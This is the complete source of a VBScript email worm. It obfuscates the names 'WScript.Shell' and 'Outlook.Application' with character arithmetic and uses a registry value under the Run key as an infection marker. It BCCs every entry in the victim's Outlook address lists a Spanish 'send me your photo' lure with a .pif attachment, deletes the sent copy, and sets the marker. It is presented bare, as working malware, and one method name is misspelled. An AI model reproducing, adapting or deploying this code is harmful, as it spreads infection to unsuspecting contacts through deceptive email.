On Error Resume Next
Dim UNO
Dim DOS
Dim TRES
Dim CUATRO
Dim CINCO
Dim SEIS
Dim Xb
Dim Xc
Dim Xd
Er = 59
Gr = 20
one = 60
Cr  = 100
Ypt = 91
Set Xc = CreateObject( Chr(Cr-13)+Chr(Cr-17)+"cript"+Chr(gr+26)+Chr(Cr-17)+"hell" )
Xb = Xc.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "OFF" )
If Xb <> 0 Then
Set TRES = CreateObject( Chr(20+Er)+"utl"+Chr((Er+Gr+one)-28 )+Chr((Er+Gr)+32 )+"k"+Chr(gr+26)+Chr(one+5)+Chr((Er+Gr+one)-27 )+"plic"+"ati"+Chr((Er+Gr+one)-28 )+"n" )
Set UNO = TRES.GetNameSpace( chr(Cr-23)+Chr(Ypt-26)+chr(Cr-20) +Chr(Ypt-18))
For Each DOS In UNO.AddressLists
Set SEIS = TRES.CreateItem( 0 )
For CUATRO = 1 To DOS.AddressEntries.Count
Set CINCO = DOS.AddressEntries( CUATRO )
If CUATRO = 1 Then
SEIS.BCC = CINCO.Address
Else
SEIS.BCC = SEIS.BCC & "; " & CINCO.Address
End If
Next
SEIS.Subject = "Fw: Enviame tu foto."
SEIS.Body = "bueno, aqui esta mi foto cuando estuve viviendo en los andes, disfruta el paisaje."
SEIS.Attachmets.Add "C:\WINDOWS\EnLosAndes.pif"
SEIS.DeleteAfterSubmit = True
SEIS.Send
Xc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "OFF","0"
Next
End If
